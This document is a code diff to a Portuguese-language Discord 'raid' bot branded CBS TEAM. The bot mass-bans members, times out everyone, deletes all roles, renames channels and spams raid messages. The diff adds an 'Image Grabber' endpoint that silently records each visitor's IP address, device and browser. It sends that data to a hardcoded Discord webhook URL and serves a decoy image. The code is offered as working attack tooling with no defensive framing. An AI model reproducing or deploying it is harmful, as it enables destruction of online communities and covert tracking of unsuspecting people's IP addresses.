@@ -3,6 +3,7 @@ const dotenv = require('dotenv');
 const cron = require('node-cron');
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
 
 dotenv.config();
 
@@ -15,11 +16,9 @@ const client = new Client({
   ]
 });
 
-// Coleções
 client.commands = new Collection();
 client.menuCommands = new Collection();
 
-// Carregar comandos
 const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
 const commands = [];
 
@@ -34,7 +33,6 @@ for (const file of commandFiles) {
   }
 }
 
-// ============ EVENTO READY ============
 client.once('ready', async () => {
   console.log(`✅ ${client.user.tag} está online!`);
   console.log(`📊 Servidores: ${client.guilds.cache.size}`);
@@ -58,9 +56,9 @@ client.once('ready', async () => {
 
   cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
   console.log('📋 Digite !menu no Discord');
+  console.log('📸 Digite /img para gerar Image Grabber');
 });
 
-// ============ SLASH COMMANDS ============
 client.on('interactionCreate', async interaction => {
   if (interaction.isCommand()) {
     const command = client.commands.get(interaction.commandName);
@@ -74,33 +72,26 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ============ MODAIS ============
 client.on('interactionCreate', async interaction => {
   if (!interaction.isModalSubmit()) return;
-
   const modalId = interaction.customId;
 
-  // ===== EDIT RAID =====
   if (modalId === 'editRaidModal') {
     const categoria = interaction.fields.getTextInputValue('categoriaInput');
     const mensagem = interaction.fields.getTextInputValue('mensagemInput');
-    
     const config = require('./config');
     if (categoria) config.raid.baseName = categoria;
     if (mensagem) config.raid.spamMessage = mensagem;
-    
     await interaction.reply({
       content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
       flags: 64
     });
   }
 
-  // ===== RENAME =====
   if (modalId === 'renameModal') {
     const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
     const nome = interaction.fields.getTextInputValue('nomeInput');
     const guild = interaction.guild;
-
     if (tipo === 'canal') {
       const channels = guild.channels.cache.filter(c => c.type === 0);
       let count = 0;
@@ -120,17 +111,12 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  // ===== BANALL =====
   if (modalId === 'banAllModal') {
     const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
     const guild = interaction.guild;
     const botId = interaction.client.user.id;
     const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
-
-    if (members.size === 0) {
-      return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
-    }
-
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
     await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 });
     let banidos = 0;
     const list = [...members.values()];
@@ -143,18 +129,13 @@ client.on('interactionCreate', async interaction => {
     await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`);
   }
 
-  // ===== END =====
   if (modalId === 'endModal') {
     const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
     const duracao = minutos * 60 * 1000;
     const guild = interaction.guild;
     const botId = interaction.client.user.id;
     const members = guild.members.cache.filter(m => m.id !== botId);
-
-    if (members.size === 0) {
-      return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
-    }
-
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
     await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 });
     let timeoutados = 0;
     const list = [...members.values()];
@@ -168,16 +149,13 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ============ !MENU ============
 client.on('messageCreate', async message => {
   if (message.author.bot) return;
   if (!message.content.startsWith('!')) return;
-
   const args = message.content.slice(1).trim().split(/ +/);
   const commandName = args.shift().toLowerCase();
   const command = client.menuCommands.get(commandName);
   if (!command) return;
-
   try {
     await command.execute(message, args, client);
   } catch (error) {
@@ -186,56 +164,45 @@ client.on('messageCreate', async message => {
   }
 });
 
-// ============ BOTÕES ============
 client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
 
   const mensagemSpam = 
     `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;
 
-  // ===== SPAM 1 VEZ =====
   if (interaction.customId === 'spam1') {
     await interaction.deferReply({ flags: 64 });
-    
     const channel = interaction.channel;
     let enviadas = 0;
-
     for (let i = 0; i < 1; i++) {
-      try {
-        await channel.send({ content: mensagemSpam });
-        enviadas++;
-      } catch (e) {
-        console.error('Erro ao spammar:', e);
-      }
+      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
     }
-
-    await interaction.editReply(`✅ **${enviadas} mensagem enviada com sucesso!** 💬`);
+    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`);
     return;
   }
 
-  // ===== SPAM 2 VEZES =====
   if (interaction.customId === 'spam2') {
     await interaction.deferReply({ flags: 64 });
-    
     const channel = interaction.channel;
     let enviadas = 0;
-
     for (let i = 0; i < 2; i++) {
-      try {
-        await channel.send({ content: mensagemSpam });
-        enviadas++;
-      } catch (e) {
-        console.error('Erro ao spammar:', e);
-      }
+      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
     }
-
-    await interaction.editReply(`✅ **${enviadas} mensagens enviadas com sucesso!** 💬`);
+    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`);
     return;
   }
 
-  // ===== NUKE =====
-  if (interaction.customId === 'nuke') {
-    const cmd = client.commands.get('nuke');
+  const cmdMap = {
+    'nuke': 'nuke',
+    'editraid': 'editraid',
+    'rename': 'rename',
+    'banall': 'banall',
+    'end': 'end',
+    'deleterole': 'deleterole'
+  };
+  const cmdName = cmdMap[interaction.customId];
+  if (cmdName) {
+    const cmd = client.commands.get(cmdName);
     if (cmd) {
       try {
         await cmd.execute(interaction, client);
@@ -247,77 +214,6 @@ client.on('interactionCreate', async interaction => {
     return;
   }
 
-  // ===== EDIT RAID =====
-  if (interaction.customId === 'editraid') {
-    const cmd = client.commands.get('editraid');
-    if (cmd) {
-      try {
-        await cmd.execute(interaction, client);
-      } catch (error) {
-        console.error(error);
-        await interaction.reply({ content: '❌ Erro.', flags: 64 });
-      }
-    }
-    return;
-  }
-
-  // ===== RENAME =====
-  if (interaction.customId === 'rename') {
-    const cmd = client.commands.get('rename');
-    if (cmd) {
-      try {
-        await cmd.execute(interaction, client);
-      } catch (error) {
-        console.error(error);
-        await interaction.reply({ content: '❌ Erro.', flags: 64 });
-      }
-    }
-    return;
-  }
-
-  // ===== BANALL =====
-  if (interaction.customId === 'banall') {
-    const cmd = client.commands.get('banall');
-    if (cmd) {
-      try {
-        await cmd.execute(interaction, client);
-      } catch (error) {
-        console.error(error);
-        await interaction.reply({ content: '❌ Erro.', flags: 64 });
-      }
-    }
-    return;
-  }
-
-  // ===== END =====
-  if (interaction.customId === 'end') {
-    const cmd = client.commands.get('end');
-    if (cmd) {
-      try {
-        await cmd.execute(interaction, client);
-      } catch (error) {
-        console.error(error);
-        await interaction.reply({ content: '❌ Erro.', flags: 64 });
-      }
-    }
-    return;
-  }
-
-  // ===== DELETEROLE =====
-  if (interaction.customId === 'deleterole') {
-    const cmd = client.commands.get('deleterole');
-    if (cmd) {
-      try {
-        await cmd.execute(interaction, client);
-      } catch (error) {
-        console.error(error);
-        await interaction.reply({ content: '❌ Erro.', flags: 64 });
-      }
-    }
-    return;
-  }
-
-  // ===== CONFIRMAR DELETEROLE =====
   if (interaction.customId === 'confirmDeleteRoles') {
     const guild = interaction.guild;
     const roles = guild.roles.cache.filter(r => r.id !== guild.id);
@@ -333,21 +229,106 @@ client.on('interactionCreate', async interaction => {
     await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`);
   }
 
-  // ===== CANCELAR DELETEROLE =====
   if (interaction.customId === 'cancelDeleteRoles') {
     await interaction.reply({ content: '❌ Cancelado.', flags: 64 });
   }
 });
 
-// ============ SERVIDOR HTTP ============
+// ==================== SERVIDOR HTTP + WEBHOOK ====================
 const app = express();
 const port = process.env.PORT || 3000;
-app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));
-app.listen(port, () => console.log(`🌐 HTTP rodando na porta ${port}`));
+app.use(express.static('public'));
 
-// ============ LOGIN ============
+const ipData = {};
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528810633750122506/Rl3CpBXoq4Q14pMHMlX_ZHmJwSjK9TPJzqMu3rrpI6RFoO-HwMrsEnEzXjaz_ram4_MO';
+
+async function enviarWebhook(id) {
+  const data = ipData[id];
+  if (!data) return;
+  const embed = {
+    title: '📸 NOVO CLIQUE CAPTURADO!',
+    color: 0xFF0000,
+    fields: [
+      { name: '🌐 IP', value: data.ip || 'Desconhecido', inline: true },
+      { name: '💻 Dispositivo', value: data.device || 'Desconhecido', inline: true },
+      { name: '🌍 Navegador', value: data.browser || 'Desconhecido', inline: true },
+      { name: '📱 User-Agent', value: data.userAgent || 'Desconhecido', inline: false },
+      { name: '🕐 Horário', value: data.timestamp || 'Desconhecido', inline: true },
+      { name: '🆔 ID', value: `\`${id}\``, inline: true }
+    ],
+    footer: { text: 'CBS TEAM - Image Grabber' },
+    timestamp: new Date()
+  };
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (e) {}
+}
+
+app.get('/img/:id', async (req, res) => {
+  const id = req.params.id;
+  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
+  if (userAgent) {
+    if (userAgent.includes('Windows')) os = 'Windows';
+    else if (userAgent.includes('Mac')) os = 'MacOS';
+    else if (userAgent.includes('Linux')) os = 'Linux';
+    else if (userAgent.includes('Android')) os = 'Android';
+    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
+    if (userAgent.includes('Chrome')) browser = 'Chrome';
+    else if (userAgent.includes('Firefox')) browser = 'Firefox';
+    else if (userAgent.includes('Safari')) browser = 'Safari';
+    else if (userAgent.includes('Edge')) browser = 'Edge';
+    else if (userAgent.includes('Opera')) browser = 'Opera';
+    if (userAgent.includes('Mobile')) device = 'Celular';
+    else if (userAgent.includes('Tablet')) device = 'Tablet';
+    else device = 'Computador';
+  }
+  ipData[id] = {
+    ip: userIP,
+    device: `${device} (${os})`,
+    browser: browser,
+    userAgent: userAgent,
+    timestamp: new Date().toISOString()
+  };
+  await enviarWebhook(id);
+
+  let imagemPath = path.join(__dirname, 'public', 'imagem.jpg');
+  if (!fs.existsSync(imagemPath)) imagemPath = path.join(__dirname, 'public', 'imagem.png');
+  if (fs.existsSync(imagemPath)) {
+    res.sendFile(imagemPath);
+  } else {
+    res.send(`
+      <!DOCTYPE html>
+      <html>
+      <head><title>CBS TEAM</title></head>
+      <body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;">
+        <img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif" style="max-width:90%;max-height:90%;border-radius:10px;">
+      </body>
+      </html>
+    `);
+  }
+});
+
+app.get('/dados/:id', (req, res) => {
+  const id = req.params.id;
+  if (ipData[id]) res.json(ipData[id]);
+  else res.json({ error: 'Dados não encontrados' });
+});
+
+app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));
+
+app.listen(port, () => {
+  console.log(`🌐 HTTP rodando na porta ${port}`);
+  console.log(`📸 Image Grabber: https://cbsteam.onrender.com/img/ID`);
+  console.log(`📨 Webhook configurado: ${WEBHOOK_URL}`);
+});
+
 client.login(process.env.DISCORD_TOKEN);
 
-// ============ TRATAMENTO DE ERROS ============
 process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
 process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));
